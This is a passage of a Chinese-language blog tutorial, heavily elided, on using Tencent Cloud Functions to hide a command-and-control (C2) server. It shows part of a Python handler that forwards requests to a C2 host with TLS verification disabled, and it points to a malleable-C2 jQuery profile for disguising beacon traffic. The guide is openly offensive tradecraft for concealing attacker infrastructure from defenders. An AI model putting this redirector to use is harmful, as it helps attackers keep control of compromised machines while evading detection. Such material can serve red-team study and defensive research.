...
**致谢：**
    ...
    [新版腾讯云函数隐藏C2--续《保姆级教程：谁说腾讯云API 网关触发器功能下线之后就没法用来隐藏C2了](https://mp.weixin.qq.com/s/1tja-ttj1E2pq-wj7aMclA)

## 新建函数服务

![image](assets/posts/2025-09-22-云函数之腾讯云/image-20250921232453-hu7zz5a.png)![image](assets/posts/2025-09-22-云函数之腾讯云/image-20250922161215-fua5jmu.png)
...
def main_handler(event, context):
    ...
    try:
        if method == 'GET':
            ...
            resp = requests.post(C2 + path, data=event.get('body',''), headers=headers, verify=False)
        
        print("Response headers:",resp.headers)
            
        print("Response content:",resp.content)
            
        # Return raw response body(no base64),decode to string for JSON transport
        ...
        response = {
            ...
            "body": resp.content.decode(errors='ignore') # decode raw bytes for text-based response
        }
        ...
        response = {
            ...
            "body":"Upstream request failed:" + str(e)
        }
...
Modify自[https://raw.githubusercontent.com/threatexpress/malleable-c2/refs/heads/master/jquery-c2.4.9.profile](https://raw.githubusercontent.com/threatexpress/malleable-c2/refs/heads/master/jquery-c2.4.9.profile)
...
![image](assets/posts/2025-09-22-云函数之腾讯云/image-20250922160951-lzmaanz.png)

‍

## 效果：

![image](assets/posts/2025-09-22-云函数之腾讯云/image-20250922162643-wa9233f.png)

![image](assets/posts/2025-09-22-云函数之腾讯云/image-20250922162804-fmrs1yl.png)​
